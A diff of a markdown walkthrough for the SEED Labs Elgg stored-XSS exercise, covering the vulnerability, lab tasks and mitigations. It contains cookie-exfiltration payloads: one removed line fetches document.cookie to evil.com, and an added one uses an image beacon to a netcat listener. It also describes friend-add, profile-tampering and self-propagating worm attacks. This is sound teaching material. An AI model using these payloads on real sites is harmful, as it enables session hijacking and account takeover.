@@ -14,55 +14,89 @@ For authorized educational use only.
 
 ---
 
-## Security Concept
+---
 
-### The Security Hole
-The web application accepts user profile text (such as "About Me" bios) and stores it raw inside the MySQL database. When another user views the profile, the application echoes the unescaped text directly into the HTML response stream (`echo $row['profile_about']`).
+## 📖 The Cross-Site Scripting Story: The Elgg Social Worm
 
-### How it Causes a Problem
-If an attacker inputs JavaScript code (`<script>...</script>`) into their profile bio, the browser receives raw script tags in the HTML response. The victim's browser cannot distinguish between application JavaScript and injected attacker JavaScript, executing the code inside the victim's authenticated session context. This enables stealing session cookies (`document.cookie`), hijacking accounts, or deploying self-propagating profile worms.
+### Act 1 — The Social Network Profile
+* The social network **`http://www.seed-server.com`** (`http://localhost:10081`) allows users like **Alice**, **Boby**, **Charlie**, and **Samy** to share posts, maintain friends lists, and fill in "About Me" profile descriptions.
+* When a user saves their profile, the content is stored in the MySQL database (`elgg_seed`).
+* When visitors view that profile, the Elgg web server fetches the stored description and renders it inside the HTML page.
 
-### Actionable Exploit Steps
-1. Attacker logs into the lab site and edits the “About Me” field, inserting a payload such as `<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`.
-2. The payload is stored unchanged in the MySQL `profile_about` column.
-3. When any victim visits the attacker's profile page, the stored payload is echoed into the page markup.
-4. The victim's browser executes the script, causing the malicious `fetch` request to send the victim's session cookie to the attacker‑controlled server (`evil.com`).
-5. The attacker can reuse the captured cookie to impersonate the victim or perform further actions.
+### Act 2 — The Vulnerability (Unsanitized Output Rendering)
+* The application takes user-supplied bio text and echoes it directly into the HTML document **without output encoding** (e.g. `echo $bio` instead of `echo htmlspecialchars($bio)`).
+* If an attacker injects `<script>` tags, the browser cannot distinguish between trusted platform code and malicious payload code.
+* The script executes with the full permissions of whoever views the profile!
+
+### Act 3 — The Exploitation Tasks (As per Official SEED Lab)
 
 ```mermaid
 sequenceDiagram
-    actor Samy as Samy (Attacker)
-    actor Alice as Alice (Victim)
-    participant Elgg as Elgg PHP Server (elgg-10.9.0.5)
-    participant DB as MySQL (mysql-10.9.0.6-xss)
-    participant Exfil as Attacker Server (evil.com)
+    autonumber
+    actor Samy as 🧑‍💻 Samy (Attacker)
+    actor Alice as 👩 Alice (Victim)
+    participant Elgg as 🎯 www.seed-server.com (Elgg)
+    participant DB as 🗄️ MySQL (elgg_seed)
 
-    Samy->>Elgg: POST /action/profile/edit  About Me = <script>alert(document.cookie)</script>
-    Elgg->>DB: INSERT profile_about = '<script>alert(document.cookie)</script>'
-    DB-->>Elgg: OK (payload stored unescaped)
-
-    Alice->>Elgg: GET /profile/samy
-    Elgg->>DB: SELECT profile_about WHERE user=samy
-    DB-->>Elgg: <script>alert(document.cookie)</script>
-    Elgg-->>Alice: HTML page with raw <script> tag embedded
-    Note over Alice: Browser executes the script!
-    Alice->>Exfil: GET /steal?c=Elgg=abc123sessiontoken
-    Note over Exfil: Attacker now has Alice's session cookie
-    Exfil-->>Samy: Cookie captured — can impersonate Alice
+    Samy->>Elgg: 1. Edit Profile Bio = <script>alert('XSS')</script>
+    Elgg->>DB: 2. Stores raw script in elgg_metadata
+    Alice->>Elgg: 3. Browse to http://www.seed-server.com/profile/samy
+    Elgg->>DB: 4. Fetches raw profile
+    Elgg-->>Alice: 5. Sends HTML with unescaped <script>
+    Note over Alice: 6. Alice's browser executes script in her session context!
 ```
 
-```php
-// Attacker saves payload into "About Me" profile field:
-// <script>alert(document.cookie)</script>
+---
 
-// Unescaped PHP code renders raw HTML:
-echo $row['profile_about'];
-// Browser receives: <script>alert(document.cookie)</script>
-// Browser executes the script in the context of any user viewing the profile
+## 🗄️ Database Forensics: Live Inspection
+
+Inspect the MySQL container (`mysql-10.9.0.6-xss`) to observe stored XSS payloads and relationships:
+
+```powershell
+# 1. Inspect user profiles metadata (bio/description)
+docker exec mysql-10.9.0.6-xss mysql -u seed -pdees elgg_seed -e "SELECT entity_guid, name, value FROM elgg_metadata WHERE name IN ('description', 'briefdescription');"
+
+# 2. Inspect friends relationship table
+docker exec mysql-10.9.0.6-xss mysql -u seed -pdees elgg_seed -e "SELECT guid_one, relationship, guid_two FROM elgg_entity_relationships WHERE relationship = 'friend';"
 ```
 
-### Actionable Mitigation
-The application must perform context-aware output encoding using `htmlspecialchars($text, ENT_QUOTES, 'UTF-8')` before inserting user-derived data into HTML documents. This converts dangerous markup characters (`<`, `>`, `"`, `'`) into harmless HTML entities (`&lt;`, `&gt;`, `&quot;`, `&#039;`), forcing the browser to display text rather than execute code.
+---
+
+## 🧪 Official Lab Tasks Walkthrough
+
+### Task 1 — Alert Window Proof-of-Concept
+* **Target:** Samy's "Brief Description" or "About Me" field.
+* **Payload:** `<script>alert('XSS');</script>`
+* **Result:** When Alice visits Samy's profile, an alert box pops up showing `XSS`.
+
+### Task 2 — Session Cookie Inspection
+* **Payload:** `<script>alert(document.cookie);</script>`
+* **Result:** The alert box reveals the victim's live session token (`elggperm`), demonstrating that the script has full access to the victim's credentials.
+
+### Task 3 — Stealing Cookies via Exfiltration Beacon
+* **Payload:** 
+  ```html
+  <script>
+    document.write('<img src="http://127.0.0.1:5555/?cookie=' + escape(document.cookie) + '" style="display:none;" />');
+  </script>
+  ```
+* **Result:** The victim's browser silently sends their cookie to the attacker's listening port (`nc -l 5555`).
+
+### Task 4 — Becoming the Victim's Friend (XSS Forgery)
+* **Payload:** An AJAX request embedded in Samy's profile that auto-sends an `action/friends/add` request with Samy's GUID (`59`) whenever anyone views his page.
+
+### Task 5 — Modifying the Victim's Profile (Profile Tampering)
+* **Payload:** An AJAX request that sends a `POST /action/profile/edit` with `description=Samy is my Hero!` and the victim's GUID.
+
+### Task 6 — Writing a Self-Propagating XSS Worm (The Samy Worm)
+* **Mechanism:** The malicious JavaScript reads its own code from the current page (`document.getElementById('worm').innerHTML`) and includes it in the profile update AJAX payload.
+* **Result:** When Alice visits Samy, her profile is infected with the worm. When Boby visits Alice, Boby is infected. The worm spreads exponentially across the entire network.
+
+### Task 7 — Output Sanitization & Encoding
+* Use `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` to convert `<` into `&lt;` and `>` into `&gt;`, neutralizing script execution.
+
+### Task 8 — Content Security Policy (CSP) Experiments
+* Visit **`http://www.example32.com`** to test nonce-based CSP directives and whitelist policies.
 
 ---
 
